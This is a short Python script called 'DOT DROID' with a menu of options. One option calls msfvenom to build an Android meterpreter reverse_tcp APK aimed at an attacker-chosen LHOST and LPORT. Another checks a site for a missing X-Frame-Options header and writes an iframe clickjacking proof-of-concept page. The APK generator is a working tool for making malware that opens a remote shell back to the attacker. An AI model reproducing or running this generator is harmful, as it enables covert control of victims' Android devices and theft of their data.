import pyfiglet
import os
import socket
from urllib.request import urlopen
from sys import argv, exit

ascii_banner = pyfiglet.figlet_format("DOT DROID")
print(ascii_banner)
def create_payload(b, e):
    print(b)
    print(e)
    home_path = os.path.expanduser('~')
    directory = "Android_Shell_Apk"
    path = os.path.join(home_path, directory)
    dir_check = os.path.isdir(path)
    if dir_check != True:
        os.mkdir(path)
    create_payload = "msfvenom -p android/meterpreter/reverse_tcp LHOST=" + b + " LPORT="+ str(e) +" R > "+ path +"/my_shell.apk"
    payload = os.popen(create_payload)
    print(payload.read())
    print("Payload Created")

def exploit():
    print("We are working on it")

def check(url):
    print("IP Address: " + socket.gethostbyname(url))
    try:
        if "http" not in url: url = "http://" + url
        data = urlopen(url)
        headers = data.info()
        if not "X-Frame-Options" in headers: return True
    except: return False

def create_poc(url):
    code = """
<html>
   <head><title>Clickjack test page</title></head>
   <body>
     <p>Website is vulnerable to clickjacking!</p>
     <iframe src="{}" width="500" height="500"></iframe>
   </body>
</html>
    """.format(url)

    with open(url + ".html", "w") as f:
        f.write(code)
        f.close()

print("1. Create Payload \n2. Exploit Payload \n3. Click Jacking Test")
a = int(input("Choose the Option: "))
if a == 1:
    print("1. Choose automatically \n2. I given IP Adrress")
    x = int(input("Choose the Option: "))
    if x == 1:
        c = os.popen('hostname -I | cut -d " " -f 1 | tr -d "\n"')
        d = c.read()
        e = int(input("Please enter LPORT number: "))
        create_payload(d, e)
    if x == 2:
        b = input("Please Enter your LHOST: ")
        e = int(input("Please enter LPORT number: "))
        create_payload(b, e)

if a == 2:
    exploit()

if a == 3:
    url = input("Please Enter URL: ")
    status = check(url)
    if status:
        print("Website is vulnerable!")
        g = input("Are you need to generate payload(y/n): ")
        if g == "y":
            create_poc(url)
            print("PoC stored in your work directory")
        else:
            print("Thanks For Using our script")
    else:
        print("Website is not vulnerable!")
